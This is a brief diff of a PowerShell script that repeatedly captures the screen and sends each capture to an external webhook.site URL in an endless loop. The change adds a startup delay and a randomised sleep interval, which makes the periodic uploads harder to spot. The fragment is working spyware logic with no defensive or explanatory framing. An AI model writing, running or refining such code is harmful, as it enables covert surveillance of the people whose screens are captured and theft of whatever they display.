@@ -42,7 +42,11 @@ function Send-ScreenCaptureToWebhook {
 
 $webhook = "https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1"
 
+Start-Sleep -Seconds 15
+
 while ($true) {
     Send-ScreenCaptureToWebhook -WebhookUrl $webhook
-    Start-Sleep -Seconds 10
+    $sleepSeconds = Get-Random -Minimum 15 -Maximum 45
+    $sleepSeconds = $sleepSeconds + 30
+    Start-Sleep -Seconds $sleepSeconds
 }
